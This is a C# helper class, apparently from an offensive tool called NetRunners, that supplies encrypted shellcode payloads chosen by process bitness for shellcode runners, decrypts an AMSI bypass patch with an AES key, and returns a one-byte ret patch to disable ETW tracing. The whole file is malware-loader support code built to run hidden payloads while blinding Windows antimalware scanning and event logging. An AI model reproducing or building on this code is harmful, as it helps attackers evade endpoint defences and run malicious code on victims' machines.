using System;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Decryptors.AesDecryptor;

namespace NetRunners.Helpers
{
    public static class Helper
    {
        public static byte[] GetPayload()  // for shellcode runners
        {
            // define buf var using bitness
            byte[] buf = (IntPtr.Size == 8) 
                ? Data.EncryptedData.buf                                // x64 payload
                : Data.EncryptedData.buf86;                             // x86 payload

            return buf;
        }
        public static int GetSize()  // for shellcode runners
        {
            // define buf var using bitness
            int sBuf = (IntPtr.Size == 8)
                ? Data.EncryptedData.sBuf                                // x64 payload
                : Data.EncryptedData.sBuf86;                             // x86 payload

            return sBuf;
        }
        public static byte[] GetAmsiPatch()
        {
            byte[] patch;

            // retrieve correct patch
            patch = (IntPtr.Size == 8)
                ? DecryptBytesToBytesAes(AmsiPatch, AesKey)             // x64 payload
                : DecryptBytesToBytesAes(AmsiPatch86, AesKey);          // x86 payload

            return patch;
        }
        public static byte[] GetEtwPatch()
        {
            byte[] patch;

            // retrieve correct patch (in this case it is always a ret func, but we are keeping this method here in case patches change)
            patch = new byte[] { 0xc3 };

            return patch;
        }
    }
}
